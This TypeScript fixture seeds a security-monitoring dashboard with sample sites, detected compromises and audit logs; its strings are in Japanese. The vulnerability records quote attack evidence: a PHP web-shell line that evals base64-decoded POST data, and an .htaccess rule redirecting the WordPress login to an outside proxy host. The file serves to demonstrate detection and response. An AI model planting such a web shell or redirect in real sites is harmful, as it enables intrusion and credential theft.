import { TargetSite, SecurityVulnerability, AuditLogEntry } from '../types';

export const INITIAL_SITES: TargetSite[] = [
  {
    id: 'site-ec',
    name: 'ECダイレクト本番ポータル',
    url: 'https://store.company.co.jp',
    adminPath: '/wp-admin',
    environment: 'production',
    status: 'critical_locked',
    primaryAdminReachable: false,
    emergencyRouteStatus: 'standby',
    emergencyRouteKeyFingerprint: 'ed25519:7a:9f:c2:88:14:bb:3d:e0:55:12:f8:6b:c4',
    emergencyRouteIp: '198.51.100.24 (検証専用暗号化ルート)',
    lastHeartbeat: '2026-09-27 14:40:12',
    latencyMs: 14,
    agentInstalled: true,
    agentVersion: 'v2.4.2-hardened',
    activeThreatCount: 3,
    cmsType: 'WordPress',
    secretToken: 'aegis_sec_ec_9981248742194721',
    customEndpointPath: '/aegis-rescue.php',
    isLiveConnected: false
  },
  {
    id: 'site-corp',
    name: 'コーポレート広報ポータル',
    url: 'https://www.company.co.jp',
    adminPath: '/admin/dashboard',
    environment: 'production',
    status: 'nominal',
    primaryAdminReachable: true,
    emergencyRouteStatus: 'connected',
    emergencyRouteKeyFingerprint: 'ed25519:3b:11:09:aa:84:cc:e9:12:44:88:31:02',
    emergencyRouteIp: '198.51.100.25 (検証専用暗号化ルート)',
    lastHeartbeat: '2026-09-27 14:41:45',
    latencyMs: 12,
    agentInstalled: true,
    agentVersion: 'v2.4.2-hardened',
    activeThreatCount: 0,
    cmsType: 'Laravel',
    secretToken: 'aegis_sec_corp_10823791247192',
    customEndpointPath: '/aegis-rescue.php',
    isLiveConnected: true,
    liveResponseData: {
      phpVersion: 'PHP 8.2.19 (Zend Engine v4.2.19)',
      serverSoftware: 'nginx/1.24.0 (Ubuntu)',
      memoryUsage: '38.4 MB / 512 MB',
      lastChecked: '2026-09-27 14:41:45',
      statusMessage: '正常疎通・暗号署名OK',
      isWritable: true
    }
  },
  {
    id: 'site-portal',
    name: '会員制B2Bポータル基盤',
    url: 'https://b2b.company.co.jp',
    adminPath: '/system/manage',
    environment: 'staging',
    status: 'nominal',
    primaryAdminReachable: true,
    emergencyRouteStatus: 'standby',
    emergencyRouteKeyFingerprint: 'ed25519:88:fa:91:00:23:44:dd:98:bb:21:77:cc',
    emergencyRouteIp: '198.51.100.26 (検証専用暗号化ルート)',
    lastHeartbeat: '2026-09-27 14:38:00',
    latencyMs: 19,
    agentInstalled: false,
    agentVersion: '未導入 (構成ファイル待機中)',
    activeThreatCount: 0,
    cmsType: 'Custom Next.js',
    secretToken: 'aegis_sec_b2b_7718293019284',
    customEndpointPath: '/api/aegis-recovery',
    isLiveConnected: false
  }
];

export const INITIAL_VULNERABILITIES: SecurityVulnerability[] = [
  {
    id: 'vuln-01',
    siteId: 'site-ec',
    type: 'backdoor',
    severity: 'critical',
    title: '不正Webシェル・バックドアエンドポイントの検知',
    targetPath: '/wp-content/uploads/2026/09/cache-patch.php',
    description: '管理画面バイパスと不正コマンド実行を可能にする難読化Webシェルコードが埋め込まれています。',
    detectedAt: '2026-09-27 14:35:10',
    evidence: '$b = base64_decode($_POST["auth_token"]); @eval($b); // Hidden C2 listener signature',
    isNeutralized: false,
    recommendedAction: '緊急暗号化ルート経由でファイルを即時隔離（パーミッション000化）し、実行プロセスを停止します。'
  },
  {
    id: 'vuln-02',
    siteId: 'site-ec',
    type: 'unauthorized_admin',
    severity: 'critical',
    title: '不正作成された特権管理者アカウント',
    targetPath: 'wp_users (ユーザーID: 9482 "sys_rescue_ghost")',
    description: '正規の承認フローを経ずにDB直接注入によって作成された不正な管理者アカウントです。',
    detectedAt: '2026-09-27 14:36:04',
    evidence: 'ユーザー名: sys_rescue_ghost, 権限: administrator, 登録元IP: 203.0.113.195 (不審な外部IP)',
    isNeutralized: false,
    recommendedAction: '当該アカウントを即座に無効化し、アクティブな全ログインセッションを強制切断します。'
  },
  {
    id: 'vuln-03',
    siteId: 'site-ec',
    type: 'tampered_config',
    severity: 'high',
    title: 'Webサーバー構成ファイル（.htaccess）の不正改ざん',
    targetPath: '/public_html/.htaccess (行 42-49)',
    description: '正規の/wp-login.phpへのアクセスが不正プロキシURLへリダイレクトされ、管理者がロックアウトされる原因となっています。',
    detectedAt: '2026-09-27 14:36:50',
    evidence: 'RewriteRule ^wp-login\\.php$ https://auth-forwarder-mirror.xyz/gate [R=302,L]',
    isNeutralized: false,
    recommendedAction: '検証済み正常テンプレート（AegisRoute Gold Master）へロールバック適用します。'
  }
];

export const INITIAL_AUDIT_LOGS: AuditLogEntry[] = [
  {
    id: 'log-01',
    timestamp: '2026-09-27 14:35:10',
    siteId: 'site-ec',
    operator: 'AegisRoute Daemon',
    channel: 'Emergency Encrypted Route',
    action: '不審なアクセスポイント・バックドアの自動検知',
    status: 'in_progress',
    details: 'HTTP管理画面への接続遮断（ロックアウト）を検知。検証専用暗号化ルートから監視プローブを起動。'
  },
  {
    id: 'log-02',
    timestamp: '2026-09-27 14:30:15',
    siteId: 'site-corp',
    operator: 'admin-securite@company.co.jp',
    channel: 'Console Zero-Trust',
    action: '定常リモートメンテナンス：キャッシュパージ＆整合性チェック',
    status: 'success',
    details: '平時メンテナンス完了。コアファイル整合性100%一致、不審アクセスなし。'
  },
  {
    id: 'log-03',
    timestamp: '2026-09-27 14:20:00',
    siteId: 'site-corp',
    operator: 'admin-securite@company.co.jp',
    channel: 'Agent Secure Pipe',
    action: '暗号化セッションハンドシェイク確立',
    status: 'success',
    details: 'Mutual TLS 1.3 / Ed25519 証明書ピン留め検証完了。トンネル遅延 12ms。'
  }
];
